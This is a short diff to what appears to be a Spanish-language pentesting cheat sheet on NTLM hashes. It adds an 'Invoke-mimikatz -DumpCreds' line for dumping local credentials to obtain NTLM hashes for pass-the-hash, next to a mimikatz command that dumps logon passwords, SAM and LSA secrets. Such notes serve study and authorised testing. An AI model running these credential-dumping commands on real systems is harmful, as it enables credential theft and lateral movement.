@@ -62,6 +62,10 @@ Características y detalles sobre el hash NTLM:
 ❯ .\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit
 ```
 
+```powershell
+❯ Invoke-mimikatz -DumpCreds          # Dumpear las credenciales locales, obtener el NTLM y hacer un PtH
+```
+
 ## Extracción de credenciales con Powershell 
 
 ```powershell 
